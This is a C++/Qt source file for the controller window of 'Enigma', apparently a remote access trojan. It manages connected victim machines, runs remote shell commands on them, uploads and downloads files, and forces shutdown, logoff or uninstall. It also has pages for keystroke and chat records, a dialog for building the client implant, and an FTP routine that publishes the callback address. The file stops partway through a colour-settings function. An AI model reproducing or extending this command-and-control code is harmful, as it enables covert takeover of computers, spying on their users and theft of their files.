/*	A part of Enigma
	Copyright 2014 Ixil
	Copyright 2015 libdll.so

	This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
*/

#include "common.h"
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "settingdialog.h"
#include "ui_settingdialog.h"
#include "aboutdialog.h"
#include "server.h"
#include "model.h"
#include "upload.h"
#include "querydialog.h"
#include "buildsvrdialog.h"
#include "download.h"
#include <QtNetwork/QTcpServer>
#include <QtNetwork/QTcpSocket>
#include <QtGui/QClipboard>
#include <QtCore/QList>
#include <QtNetwork/QFtp>
#include <QtGui/QFileDialog>
#include <QMessageBox>
#include <QtGui/QTextBlock>
#include <QtCore/QTimer>
#include <QtCore/QTextCodec>
#include <QtGui/QColor>
#include <assert.h>
#include <stdio.h>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
	ui->setupUi(this);
	/////////////////////////////
	readSettings();
	getHostIpList();
	DataAnalysis::initEnvironment();
	ApplyTerminalSettings();
	/////////////////////////////

	ftp=new QFtp(this);
	server = new Server();
	if(!server->initServer(HostPort)) {
		QMessageBox::critical(this, windowTitle(), tr("Cannot open port %1").arg(HostPort));
		//QApplication::exit(1);
		exit(1);
	}
	download = new Download(server);
	upload = new Upload(server);

	connect(server,SIGNAL(needRefreshItem(ushort,Server::RefreshType)),
		this,SLOT(reFreshClientsList(ushort,Server::RefreshType)));

	connect(server,SIGNAL(dataReceived(short,QByteArray*)),
		this,SLOT(dataReceived(short,QByteArray*)));

#if 0
	connect(this,SIGNAL(startUploadHandler(char,qint64)),
		this,SLOT(uploadTableHandler(char,qint64))/*, Qt::QueuedConnection*/);
#endif

/*替换客户端列表
	this->ui->clientsTable->setSelectionBehavior ( QAbstractItemView::SelectRows); //设置选择行为，以行为单位
	this->ui->clientsTable->setSelectionMode ( QAbstractItemView::SingleSelection); //设置选择模式，选择单行
*/
	this->ui->clientsList->setSelectionMode(QAbstractItemView::SingleSelection);
	//this->ui->clientAreaStackedWidget->setEnabled(false);//暂时打开

	//this->ui->clientsList->setColumnCount(4);
	//QStringList headers;
	//headers << "地址" << "计算机名" << "用户名" << "备注";
	//this->ui->clientsList->setHeaderLabels(headers);
	//ui->uploadFileSizeLabel
}

void MainWindow::reFreshClientTable()
{

}

void MainWindow::reFreshClientsList(ushort id,Server::RefreshType type)
{
	qDebug("slot: reFreshClientsList(%hu, %d)", id, type);
     QTreeWidgetItem *root;
     QStringList clientToAdd;
    //qDebug("function: reFreshClientsList: %d", ui->clientsList->topLevelItemCount());
     int last_count = ui->clientsList->topLevelItemCount();
     qDebug("reFreshClientsList: last_count = %d", last_count);
    switch(type)
    {
    case Server::Refresh_Add:
        qDebug() << server->clientsList[id]->ip;
	assert(id == last_count);
        clientToAdd << server->clientsList[id]->ip << server->clientsList[id]->userName << server->clientsList[id]->computerName;
	//qDebug() << server->clientsList[id]->userName;
	//qDebug() << clientToAdd;
        root = new QTreeWidgetItem(this->ui->clientsList, clientToAdd);

        root->setIcon(0,QIcon(":/toolbaricons/icons/computer.png"));
        this->ui->clientsList->addTopLevelItem(root);
        //if(ui->clientsList->columnCount()==1)server->setCurrentIndex(0);
	qDebug("reFreshClientsList: Add: %d", ui->clientsList->topLevelItemCount());
        if(!last_count) {
            ui->clientsList->setCurrentItem(root);
            ui->clientAreaStackedWidget->setEnabled(true);
        }
        //ui->clientsList->setCurrentIndex();
	qDebug("Refresh_Add: %p", ui->clientsList->currentItem());
	ui->clientsList->resizeColumnToContents(0);
        break;
    case Server::Refresh_Remove://有 问题 XXX: 延时问题
        root=this->ui->clientsList->takeTopLevelItem(id);
        //this->ui->clientsList->removeItemWidget(root,0);
	qDebug("reFreshClientsList: Remove: %d", ui->clientsList->topLevelItemCount());
	qDebug("last_count = %d, root = %p", last_count, root);
	qDebug("reFreshClientsList: Remove: %d", ui->clientsList->topLevelItemCount());
        //if(server->clientsList.count()>0)
        //    this->ui->clientsList->itemAt(0,0)->setSelected(true);
        //qDebug("Refresh_Remove: %p", ui->clientsList->currentItem());
        //if(last_count) {
        if(last_count - 1) {
	    if(root->isSelected()) this->ui->clientsList->itemAt(0, 0)->setSelected(true);
	    //this->ui->clientsList
	} else {		//空
            this->ui->clientAreaStackedWidget->setEnabled(false);
	    this->ui->feedbackTextEdit->clear();
        }
        //this->ui->clientsList->setcurr;
        delete root;
        break;
    case Server::Refresh_Update:
        root=this->ui->clientsList->topLevelItem(id);
	qDebug("id = %d\nroot = %p", id, root);
	if(!root) {
		qCritical("PANIC: Press ENTER to crash...");
		getchar();
	}
	root->setText(1, server->clientsList[id]->computerName);
	root->setText(2, server->clientsList[id]->userName);
	root->setText(3, server->clientsList[id]->uniqueID);
	root->setText(4, server->clientsList[id]->remarks);
	if(this->ui->clientsList->currentItem()==root) {
            this->on_clientsList_currentItemChanged(root,NULL);
	}
        //this->ui->currentClientEdit->setText(server->clientsList[id]->remarks);
	ui->clientsList->resizeColumnToContents(3);
        break;
    }
}

MainWindow::~MainWindow()
{
    delete server;
    delete ui;
    delete upload;
}

void MainWindow::quitEventLoop(bool ret)
{
    eventLoopRet=ret;
    //((QEventLoop*) sender())->exit(ret?1:0);
}

void MainWindow::on_uninstallButton_clicked()
{
    QByteArray *sendData;

    sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_Command_Uninstall,NULL);
    server->sendToCurrentClient(*sendData);
    delete sendData;
}

void MainWindow::on_uninstallAllButton_clicked()
{

}

void MainWindow::on_sendMsgButton_clicked()
{
     QByteArray *sendData;
     QByteArray title, text, tmp;
     NetMessage msg;
     QTextCodec *codec = QTextCodec::codecForName("GB18030");
	if(codec) {
		title = codec->fromUnicode(ui->msgTitleEdit->text());
		text = codec->fromUnicode(ui->msgBodyEdit->toPlainText());
	} else {
		QMessageBox::warning(this, tr("Enigma"), tr("GB18030 is not supported"));
		title = ui->msgTitleEdit->text().toUtf8();
		text = ui->msgBodyEdit->toPlainText().toUtf8();
	}
     strcpy(msg.caption, title.data());
     msg.mode=this->ui->MultiCheckBox->isChecked();
     msg.time=(short)this->ui->delayCloseSpinBox->value();
     //tmp.clear();
     tmp.append((char*)&msg, sizeof msg);
     tmp.append(title);
     sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_Message,&tmp);
     server->sendToCurrentClient(*sendData);
     delete sendData;
}

void MainWindow::on_shutdownButton_clicked()
{
    QByteArray *sendData;

    sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_Command_Shutdown,NULL);
    server->sendToCurrentClient(*sendData);
    delete sendData;
}

void MainWindow::on_restartButton_clicked()
{
    QByteArray *sendData;

    sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_Command_Restart,NULL);
    server->sendToCurrentClient(*sendData);
    delete sendData;
}

void MainWindow::on_logoffButton_clicked()
{
    QByteArray *sendData;

    sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_Command_Logoff,NULL);
    server->sendToCurrentClient(*sendData);
    delete sendData;
}

void MainWindow::on_cutNetButton_clicked()
{

}

void MainWindow::on_clearButton_clicked()
{
    this->ui->feedbackTextEdit->setText(CONSOLE_PROMPT);
    server->getCurrentClientInfo()->batchScreenBuffer = CONSOLE_PROMPT;
}

void MainWindow::on_copyButton_clicked()
{
    QClipboard *clipboard = QApplication::clipboard();
    clipboard->setText(ui->feedbackTextEdit->toPlainText());
}


void MainWindow::on_commandLineEdit_returnPressed()
{
    this->on_submitCmdButton_clicked();
}

void MainWindow::on_submitCmdButton_clicked()
{
	if(ui->commandLineEdit->text().isEmpty()) return;

    this->ui->submitCmdButton->setEnabled(false);
    if(server->getCurrentIndex()>=0 && ! server->getCurrentClientInfo()->batchRunning)
    {
        server->getCurrentClientInfo()->batchRunning=true;
        //this->ui->feedbackTextEdit->append(this->ui->commandLineEdit->text());
        //this->ui->feedbackTextEdit->append("\r\n");
	server->getCurrentClientInfo()->batchScreenBuffer.append(this->ui->commandLineEdit->text() + "\n");
        ui->feedbackTextEdit->setText(server->getCurrentClientInfo()->batchScreenBuffer);
        QTextCursor cursor = ui->feedbackTextEdit->textCursor();
        cursor.movePosition(QTextCursor::End);
        ui->feedbackTextEdit->setTextCursor(cursor);

        QByteArray buf;
	buf.append((char)0);	// 0表示命令，1表示重置
        buf.append(this->ui->commandLineEdit->text());
	buf.append((char)0);
        QByteArray *sendData;
	sendData = DataAnalysis::modulateData(DataAnalysis::ToClient_CommandLine,&buf);
        this->ui->statusBar->showMessage(tr("正在发送命令"));
        server->sendToCurrentClient(*sendData);

        delete sendData;
        this->ui->statusBar->showMessage(tr("正在执行命令"));
        this->ui->commandLineEdit->clear();
    }

    this->ui->submitCmdButton->setEnabled(true);
}

void MainWindow::dataReceived(short int index,QByteArray *data)
{
	qDebug("slot: dataReceived(%hd, %p)", index, data);
	//qDebug(data->data()+4);
	qDebug() << *data;
	DataAnalysis::DataType type;
	QByteArray *result;
	type=DataAnalysis::demodulateData(data,result);
	QString temp;
	qDebug("type = %d", type);
	switch(type)
	{
		case DataAnalysis::ToServer_CmdLineFeedBack:
		{
			temp.append(QTextCodec::codecForName("UTF-8")->toUnicode(*result));
			temp.append("\n" CONSOLE_PROMPT);
			server->clientsList[index]->batchScreenBuffer.append(temp);
			this->ui->feedbackTextEdit->setText(server->clientsList[index]->batchScreenBuffer);
			//int lineCount=this->ui->feedbackTextEdit->textCursor().block().lineCount();
			//const QTextBlock &block = ui->feedbackTextEdit->document()->findBlockByNumber(lineCount - 1);
			//QTextCursor cursor(block);
			QTextCursor cursor = ui->feedbackTextEdit->textCursor();
			cursor.movePosition(QTextCursor::End);
			ui->feedbackTextEdit->setTextCursor(cursor);
			server->clientsList[index]->batchRunning=false;
			this->ui->statusBar->showMessage("命令执行完毕");
			break;
		}
		case DataAnalysis::ToServer_SystemInfo:
			temp.append(*result);
			this->ui->systemInfoBrowser->setText(temp);
			break;
		case DataAnalysis::ToServer_ConnectionInfo:
		{
			qDebug("DataAnalysis::ToServer_ConnectionInfo");
			ConnectionInfo *connInfo;
			//DataPtr;
			//bool replace_old = false;
			int replace_old_index = -1;

			connInfo=(ConnectionInfo*)result->constData();//->data();
			QByteArray id(connInfo->uniqueID,16);
			for(int i=0; i<server->getClientsCount(); i++) {
				if(server->clientsList[i]->uniqueID == id) {
					qDebug("Dup!!\nid = %s", id.data());
					ui->statusBar->showMessage(QString("%1 DUP!").arg(QString(id)));
					//idx = i;
					server->clientsList[index]->batchScreenBuffer = server->clientsList[i]->batchScreenBuffer;
					if(server->clientsList[i]->batchRunning) server->clientsList[index]->batchScreenBuffer += "\n" CONSOLE_PROMPT;
					//server->clientsList[i]->client->close();
					//server->clientsList[i]->client->abort();
					//sleep(1);
					replace_old_index = i;
					break;
				}
			}
			server->clientsList[index]->computerName = QString(connInfo->computerName);
			server->clientsList[index]->userName = QString(connInfo->userName);
			server->clientsList[index]->uniqueID = id;
			reFreshClientsList(index, Server::Refresh_Update);
			if(replace_old_index >= 0) {
				QTreeWidgetItem *item = ui->clientsList->topLevelItem(replace_old_index);
				if(item && item->isSelected()) {
					item->setSelected(false);
					ui->clientsList->topLevelItem(index)->setSelected(true);
				}
				server->clientsList[replace_old_index]->client->abort();
			}
			break;
		}
		case DataAnalysis::ToServer_CloseMessageBox:
		{
			QString title;
			title=QString("来自 %1 的消息反馈").arg(server->clientsList[index]->getRemarks());
			temp.append(*result);
			QMessageBox::information(NULL,title,temp);
			break;
		}
		case DataAnalysis::ToServer_UploadFileBack:
		{
			Upload::Feedback *feedback;
			feedback=(Upload::Feedback*)result->constData();
			qDebug("uploadFileBack:");
			qDebug("flag=%d,size=%lld",feedback->flag,feedback->size);
			switch(feedback->flag)
			{
				case Tr::Request:
				{
					qDebug("upload request back");
					qDebug("%lld",feedback->size);
					if(feedback->size>0)
					{
						QueryDialog queryDialog;
						queryDialog.setQueryButtonsText("取消","续传","覆盖","");
						queryDialog.setQueryCaption("提示");
						queryDialog.setQueryText("服务端已经存在该文件，请选择要执行的操作。");
						queryDialog.move(queryDialog.center());
						switch(queryDialog.exec())
						{
						case 2:
						    //emit startUploadHandler(Upload::Trunc,0);
						    upload->requestTruncFile();

						    break;
						case 1:
						    upload->requestAppendFile(feedback->size);

						    break;
						case 0:
						    ui->readyUploadButton->setEnabled(true);
						    break;
						}
					} else {
							//emit startUploadHandler(Upload::Trunc,0);
							upload->requestTruncFile();
					}
					break;
				}
				case Tr::Trunc:
					if(feedback->size<0)
					{
						this->ui->readyUploadButton->setEnabled(true);
					}else{
						upload->requestSendData();
						qDebug("begin upload data");
						//upload->requestTruncFile();
					}
					break;
				case Tr::Append:
					qDebug("upload trunc/append back");
					if(feedback->size<0)
					{
						this->ui->readyUploadButton->setEnabled(true);
					}else{
						upload->requestSendData();
						qDebug("begin upload data");
					}
					break;
				case Tr::Data:
					if(feedback->size<0)
					{
						this->ui->readyUploadButton->setEnabled(true);
						upload->requestTerminate();
						//emit startUploadHandler(Upload::Terminate,0);
					} else {
						qDebug("%lld/%lld",feedback->size,upload->fileSize);
						this->ui->uploadProcessBar->setValue(((double)feedback->size)/upload->fileSize*100);
						this->ui->uploadBytesLabel->setText(roundFileSize(feedback->size));
						if(feedback->size >= upload->fileSize)
						{
							//startUploadHandler(Upload::Terminate,UploadInfo::Complated);
							upload->requestTerminate();
							QMessageBox::information(0,tr("提示"),tr("文件上传完毕"));
							this->ui->uploadBytesLabel->setText("0 B");
							this->ui->uploadProcessBar->setValue(0);
							this->ui->readyUploadButton->setEnabled(true);
						}
					}
					break;
				}

			//feedback=
			//((int*)result->left(sizeof(char)).data())
			break;
		}
		case DataAnalysis::ToServer_DownloadFileBack: {
			qDebug("DataAnalysis::ToServer_DownloadFileBack");
			Download::DownloadFeedback *feedback = (Download::DownloadFeedback *)result->constData();
			qDebug() << "feedback->flag =" << feedback->flag;
			switch(feedback->flag) {
				case Tr::Request:
					qDebug("feedback->size = %lld", (long long int)feedback->size);
					if(feedback->size < 0) {
						ui->statusBar->showMessage("Download failed", 10);
						ui->DownloadButton->setEnabled(true);
					} else if(feedback->size > 0) {
						download->fileSize = feedback->size;
						qDebug("fileSize = %lld", download->fileSize);
						ui->downloadFileSizeLabel->setText("/ " + roundFileSize(feedback->size));
					} else {
						qDebug("Zero sized");
						ui->statusBar->showMessage("Zero sized");
					}
					break;
				case Tr::Data: {
					//qDebug("已收到数据");
					if(!download->isOpen()) break;
					qint64 current_pos = download->pos() + feedback->size;
					if(download->write((const char *)feedback->data, feedback->size) < 0) {
						QMessageBox::critical(this, tr("Download"), tr("Failed to write file %1").arg(download->fileName()));
						download->requestTerminate();
						ui->DownloadButton->setEnabled(true);
						break;
					}
					qDebug("current_pos = %lld", current_pos);
					ui->downloadProcessBar->setValue(100 * current_pos / download->fileSize);
					ui->downloadBytesLabel->setText(roundFileSize(current_pos));
					if(current_pos == download->fileSize) {
						qDebug("Download finished");
						download->close();
						QMessageBox::information(this, tr("Download"), tr("Download finished"));
						ui->DownloadButton->setEnabled(true);
						ui->downloadProcessBar->setValue(0);
					}
					break;
				}
				default:
					qWarning(__FILE__ ":%d: warning: dataReceived: case DataAnalysis::ToServer_DownloadFileBack: unknown 'feedback->flag' %d", __LINE__, feedback->flag);
					break;
			}
			break;
		}
		case DataAnalysis::TypeError:
			qWarning("DataAnalysis::TypeError");
			delete data;
			return;
	}

	delete result;
	delete data;
	qDebug("返回数据处理完毕\nend of slot dataReceived");
}

/*
void MainWindow::on_exitAction_triggered()
{
    //delete server;
    this->close();
}*/

void MainWindow::on_createClientAction_triggered()
{
    BuildSvrDialog buildDialog(this);
    buildDialog.exec();
}

void MainWindow::on_showListAction_triggered(bool checked)
{
/*
    if(!checked)
    {
        this->ui->dockWidget->close();
    }
    else
    {
        this->ui->dockWidget->show();
    }
*/
	this->ui->dockWidget->setVisible(checked);
}

void MainWindow::on_settingAction_triggered()
{
    SettingDialog settingDialog(this);

    if(settingDialog.exec())
    {
        st_FtpAddress=settingDialog.ui->ftpAddrEdit->text();
        st_FtpPort=settingDialog.ui->ftpPortEdit->text();
        st_Username=settingDialog.ui->ftpUserNameEdit->text();
        st_Password=settingDialog.ui->ftpPassWordEdit->text();
        st_FtpFileName=settingDialog.ui->ftpFileNameEdit->text();
        st_ConnAddrToFtp=settingDialog.ui->connAddrComboBox->currentText();
        st_ConnPortToFtp=settingDialog.ui->connPortEdit->text();
	HostPort = settingDialog.ui->hostPortEdit->text().toUInt();
	MaxConnections = settingDialog.ui->maxConnectionsEdit->text().toUInt();
	//st_BackgroundColor=QString("%1").arg(settingDialog.ui->backColorCombo->currentIndex());
	//st_ForegroundColor=QString("%1").arg(settingDialog.ui->foreColorCombo->currentIndex());
	ForegroundColor = settingDialog.ui->foreColorCombo->currentIndex();
	BackgroundColor = settingDialog.ui->backColorCombo->currentIndex();
        saveSettings();
	ApplyTerminalSettings();
    }
}

void MainWindow::on_updateFtpAction_triggered()
{

    this->ui->updateFtpAction->setEnabled(false);
    this->statusBar()->showMessage(tr("正在更新FTP. . ."));

    ftp->connectToHost(st_FtpAddress,st_FtpPort.toUInt());
    ftp->login(st_Username,st_Password);

    QByteArray dataToFtp;
    dataToFtp=QString(st_ConnAddrToFtp+":"+st_ConnPortToFtp).toUtf8();
    ftp->cd("/");
    ftp->put(dataToFtp,st_FtpFileName,QFtp::Binary);

    QEventLoop eventLoop;

    connect(ftp,SIGNAL(done(bool)), this, SLOT(quitEventLoop(bool)));
    connect(ftp,SIGNAL(done(bool)),&eventLoop,SLOT(quit()));
    QTimer::singleShot(30000, &eventLoop, SLOT(quit()));
    eventLoop.exec();

    ftp->abort();

    if(eventLoopRet)
        this->statusBar()->showMessage("FTP更新失败");
    else
        this->statusBar()->showMessage("FTP更新成功");
    ftp->disconnect(this);
    ftp->disconnect(&eventLoop);
    ftp->close();
        this->ui->updateFtpAction->setEnabled(true);

}



void MainWindow::on_keepListenAction_triggered(bool checked)
{
    if(checked)
        server->startListen();
    else
        server->pauseListen();
}

void MainWindow::on_clientsList_currentItemChanged(QTreeWidgetItem *current, QTreeWidgetItem *previous)
{
	if(current==0 || current->treeWidget()->currentIndex().row()<0)
	{
		qDebug("currentItemChanged()  row < 0");
		return;
	}
	int idx=current->treeWidget()->currentIndex().row();
	server->setCurrentIndex(idx);
	this->ui->feedbackTextEdit->setText(server->getCurrentClientInfo()->batchScreenBuffer);
	//bool empty=current->treeWidget()->currentItem()->text(4).isEmpty();
	//this->ui->currentClientEdit->setText(current->treeWidget()->currentItem()->text(empty?1:4)+" | "+current->treeWidget()->currentItem()->text(0));
	QString display = current->treeWidget()->currentItem()->text(4);
	if(display.isEmpty()) display = current->treeWidget()->currentItem()->text(1);
	else display += " | " + current->treeWidget()->currentItem()->text(1);
	this->ui->currentClientEdit->setText(display);
}


void MainWindow::on_terminalAction_triggered()
{
        this->ui->clientAreaStackedWidget->setCurrentIndex(0);
}

void MainWindow::on_broadcastAction_triggered()
{
    this->ui->clientAreaStackedWidget->setCurrentIndex(1);
}
void MainWindow::on_uploadFileAction_triggered()
{
    this->ui->clientAreaStackedWidget->setCurrentIndex(2);
}
void MainWindow::on_keybdRecordAction_triggered()
{
    this->ui->clientAreaStackedWidget->setCurrentIndex(3);
}
void MainWindow::on_chatRecordAction_triggered()
{
    this->ui->clientAreaStackedWidget->setCurrentIndex(4);
}

void MainWindow::on_systemInfoAction_triggered()
{
    this->ui->clientAreaStackedWidget->setCurrentIndex(5);
}


void MainWindow::on_aboutAction_triggered()
{
    AboutDialog aboutDlg(this);
    aboutDlg.exec();

}


void MainWindow::on_refreshListButton_clicked()
{

    QStringList clientToAdd;
    QTreeWidgetItem * root;
    this->ui->clientsList->clear();
    for(int id=0;id<server->getClientsCount();id++)
    {
        clientToAdd.clear();
        clientToAdd << server->clientsList[id]->ip
                    << server->clientsList[id]->computerName
                    << server->clientsList[id]->userName
                    << server->clientsList[id]->uniqueID
                    << server->clientsList[id]->remarks;
        root = new QTreeWidgetItem(this->ui->clientsList, clientToAdd);
        root->setIcon(0,QIcon(":/toolbaricons/icons/computer.png"));
        this->ui->clientsList->addTopLevelItem(root);
    }
}



void MainWindow::on_previewButton_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(this,
                                                    tr("打开"),
                                                    "",
						    tr("所有文件(*);;"));
    if(!fileName.isEmpty()) {
        this->ui->uploadFileNameEdit->setText(fileName);
    }
}

void MainWindow::on_addToUploadListButton_clicked()
{
/*
    QStringList itemsText;
    UploadInfo uploadInfo;
    QString filename=this->ui->uploadFileNameEdit->text();
    double filesize = QFileInfo(filename).size();
    uploadInfo.fileSize=filesize;
    const char *units;
    if(filesize<1024)
    {
        units="B";
    }else if(filesize<1024*1024)
    {
        units="KB";
        filesize/=1024;
    }else if(filesize<1024*1024*1024)
    {
        units="MB";
        filesize/=1024*1024;
    }else
    {
        units="GB";
        filesize/=1024*1024*1024;
    }

    QString sizeText;
    sizeText.sprintf("%0.2lf %s",filesize,units);


    itemsText << filename
              << server->getCurrentClientInfo()->getRemarks()
              << sizeText
              << tr("等待");


    uploadInfo.state=UploadInfo::Waiting;
    uploadInfo.fileName=QFileInfo(filename).fileName();

    QTreeWidgetItem * item = new QTreeWidgetItem(this->ui->uploadTreeWidget,itemsText);
    this->ui->uploadTreeWidget->addTopLevelItem(item);

    uploadInfo.uniqueName=server->getCurrentClientInfo()->client->objectName();
    item->setData(0,Qt::UserRole,QVariant::fromValue(uploadInfo));

    qDebug() << server->getCurrentClientInfo()->client->objectName();
    //uploadTableHandler(this->ui->uploadTreeWidget,Upload::Request);
    //if(ui->uploadTreeWidget->topLevelItemCount()==1)
    emit startUploadHandler(Upload::Request,0);
    //uploadInfo);
    */
}

//删除中。

//QFileInfo::isFile();
void MainWindow::on_uploadFileNameEdit_textChanged(const QString &text)
{
    //ui->addToUploadListButton->setEnabled(QFileInfo(text).isFile());
    ui->readyUploadButton->setEnabled(QFileInfo(text).isFile());
}


/*
void MainWindow::on_uploadTreeWidget_currentItemChanged(QTreeWidgetItem *current, QTreeWidgetItem *previous)
{
    if(current)
    {
        UploadInfo uploadInfo;
        uploadInfo=current->treeWidget()->currentItem()->data(0,Qt::UserRole).value<UploadInfo>();
        ui->deleteFromUploadListButton->setEnabled(true);
        ui->jtqUploadListButton->setEnabled(current->treeWidget()->currentIndex().row()>=1);
        //ui->pauseUploadButton->setEnabled(current->treeWidget()->currentIndex().row()==0 && current->text(2)=="下载中");
        if(uploadInfo.state==UploadInfo::Transmating)
        {
            ui->pauseUploadButton->setText(tr("暂停"));
            ui->pauseUploadButton->setEnabled(true);
        }else if(uploadInfo.state==UploadInfo::Complated)
        {
            ui->pauseUploadButton->setText(tr("暂停"));
            ui->pauseUploadButton->setEnabled(false);
        }else if(uploadInfo.state==UploadInfo::Pause)
        {
            ui->pauseUploadButton->setText(tr("继续"));
            ui->pauseUploadButton->setEnabled(true);
        }else if(uploadInfo.state==UploadInfo::Waiting)
        {
            ui->pauseUploadButton->setText(tr("暂停"));
            ui->pauseUploadButton->setEnabled(true);
        }else if(uploadInfo.state==UploadInfo::Error)
        {
            ui->pauseUploadButton->setText(tr("重新上传"));
            ui->pauseUploadButton->setEnabled(true);
        }else if(uploadInfo.state==UploadInfo::Requesting)
        {
            ui->pauseUploadButton->setText(tr("取消上传"));
            ui->pauseUploadButton->setEnabled(true);
        }
    }else{
        ui->deleteFromUploadListButton->setEnabled(false);
        ui->jtqUploadListButton->setEnabled(false);
    }
}
*/

/*
void MainWindow::uploadTableHandler(char f,qint64 param)
{
    char flag=f;
    bool needSend=false;
    QTreeWidget*list=this->ui->uploadTreeWidget;
    if(list->topLevelItemCount()==0)return;

    for(int i=0;i<list->topLevelItemCount();i++)
    {
        UploadInfo uploadInfo=list->topLevelItem(i)->data(0,Qt::UserRole).value<UploadInfo>();
        if(uploadInfo.state==UploadInfo::Pause)
        {
            switch(flag)
            {
                continue;
            }
        }
        if(uploadInfo.state==UploadInfo::Waiting)
        {
            qDebug("state: waiting");
            switch(flag)
            {
                case Upload::Request:
                {
                    uploadInfo.state=UploadInfo::Requesting;
                    upload->setUploadInfo(uploadInfo.uniqueName,list->topLevelItem(i)->text(0),0);
                    list->topLevelItem(i)->setText(3,tr("正在请求"));
                    needSend=true;
                    break;
                }
            }
        }
        else if(uploadInfo.state==UploadInfo::Transmating)
        {
            qDebug("state: transmating");
            switch(flag)
            {
            case Upload::Terminate:
                switch(param)
                {
                case UploadInfo::Error:
                    list->topLevelItem(i)->setText(3,tr("上传出错"));
                    break;
                case UploadInfo::Pause:
                    list->topLevelItem(i)->setText(3,tr("暂停"));
                    break;
                case UploadInfo::Complated:
                    list->topLevelItem(i)->setText(3,tr("上传成功"));
                    break;
                default:
                    qDebug("不可预料的标记");
                }
                uploadInfo.state=(UploadInfo::State)param;

                break;
            default:
                qDebug("错误的标记");
            }
        }
        else if(uploadInfo.state==UploadInfo::Requesting)
        {
            qDebug("state: request");
            switch(flag)
            {

            case Upload::Append:
            {
                qDebug("append");
                uploadInfo.state=UploadInfo::Transmating;
                upload->fileSize=uploadInfo.fileSize;
                list->topLevelItem(i)->setText(3,tr("正在上传"));
                upload->setUploadInfo(uploadInfo.uniqueName,
                                      list->topLevelItem(i)->text(0),
                                      param);
                needSend=true;
                break;
            }
            case Upload::Trunc:
            {
                qDebug("trunc");
                uploadInfo.state=UploadInfo::Transmating;
                list->topLevelItem(i)->setText(3,tr("正在上传"));

                //list->topLevelItem(i)->data(0,Qt::UserRole)<UploadInfo>()
                upload->setUploadInfo(uploadInfo.uniqueName,list->topLevelItem(i)->text(0),0);
                upload->fileSize=uploadInfo.fileSize;
                needSend=true;
                break;
            }
            case Upload::Terminate:
            {
                break;
            }
            }
        }
        list->topLevelItem(i)->setData(0,Qt::UserRole,QVariant::fromValue(uploadInfo));
        if(needSend)
        {
            QByteArray effData;
            effData.append((char*)&flag,sizeof(char));
            effData.append(uploadInfo.fileName);
            effData.append((char)0);
            QByteArray*sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_UploadFile,&effData);
            qDebug("dbg");
            if(server->sendToClient(sendData,uploadInfo.uniqueName)<0)
            {
                qDebug("上传 request 失败 ");
            }
            delete sendData;
            return;
        }
        break;
    }
    //QThread
    //QEventLoop eventLoop;
    //QTimer::singleShot(1000, &eventLoop, SLOT(quit()));
    //eventLoop.exec();
}
*/

void MainWindow::on_readyUploadButton_clicked()
{
	QString fileName = ui->uploadFileNameEdit->text();
	assert(!fileName.isEmpty());
	this->ui->uploadFileSizeLabel->setText("/ " + roundFileSize(QFileInfo(fileName).size()));
	this->ui->uploadBytesLabel->setText("0 B");
    ui->readyUploadButton->setEnabled(false);
    if(!upload->requestUpload(server->getCurrentClientInfo()->client->objectName(),
                          this->ui->uploadFileNameEdit->text()))
    {
        //qDebug("requestUpload() error");
        ui->readyUploadButton->setEnabled(true);
    }
}

void MainWindow::DownloadFile() {
	qDebug("slot: DownloadFile()");
	QString remote_name = ui->downloadFileEdit->text();
	if(remote_name.isEmpty()) return;
	QFileInfo filename_info(remote_name);
	QString local_name = QFileDialog::getSaveFileName(this, tr("Save As"), filename_info.fileName(), QString::null, NULL, QFileDialog::DontUseNativeDialog);
	if(local_name.isEmpty()) return;
	ui->DownloadButton->setEnabled(false);
	if(!download->requestDownload(server->getCurrentClientInfo()->client->objectName(), remote_name, local_name)) {
		qDebug("Download failed");
		ui->DownloadButton->setEnabled(true);
	}
}

void MainWindow::on_resetBatchButton_clicked()
{
    if(server->getCurrentIndex()>=0 && server->getCurrentClientInfo()->batchRunning)
    {
        server->getCurrentClientInfo()->batchRunning=false;
	server->getCurrentClientInfo()->batchScreenBuffer.append("命令被强制中断\n" CONSOLE_PROMPT);

        QByteArray buf;
        buf.append((char)1);//0表示命令1表示重置
        QByteArray *sendData;
        sendData= DataAnalysis::modulateData(DataAnalysis::ToClient_CommandLine,&buf);
        //this->ui->statusBar->showMessage("正在发送重置命令");
        server->sendToCurrentClient(*sendData);
        ui->feedbackTextEdit->setText(server->getCurrentClientInfo()->batchScreenBuffer);
        QTextCursor cursor = ui->feedbackTextEdit->textCursor();
        cursor.movePosition(QTextCursor::End);
        ui->feedbackTextEdit->setTextCursor(cursor);
        delete sendData;
	ui->statusBar->clearMessage();
    }
}

void MainWindow::DownloadFilePathEditEvent() {
	ui->DownloadButton->setEnabled(!ui->downloadFileEdit->text().isEmpty());
}

void MainWindow::ApplyTerminalSettings() {
	qDebug("ForegroundColor = %d, BackgroundColor = %d", ForegroundColor, BackgroundColor);
#define STYLE_SHEET_FORMAT "color: rgb(%d, %d, %d);\n"\
					"background-color: rgb(%d, %d, %d);\n"\
					"selection-background-color: rgb(200, 200, 200);\n"\
					"selection-color: rgb(0, 0, 0);\n"\
					"font: 9pt \"Fixedsys\";\n"
	QColor *foreground_color, *background_color;
	//Qt::GlobalColor foreground_color;
	switch(ForegroundColor) {
		default:
		case 0:
			foreground_color = new QColor(Qt::lightGray);
			//foreground_color = Qt::lightGray;
			break;
		case 1:
			foreground_color = new QColor(Qt::gray);
			break;
		case 2:
			foreground_color = new QColor(Qt::white);
			break;
		case 3:
			foreground_color = new QColor(Qt::black);
			break;
		case 4:
			foreground_color = new QColor(Qt::red);
			break;
		case 5:
			foreground_color = new QColor(Qt::green);
			break;
		case 6:
			foreground_color = new QColor(Qt::blue);
			break;
		case 7:
			foreground_color = new QColor(Qt::yellow);
			break;
		case 8:
			foreground_color = new QColor(255, 69, 0);
			break;
		case 9:
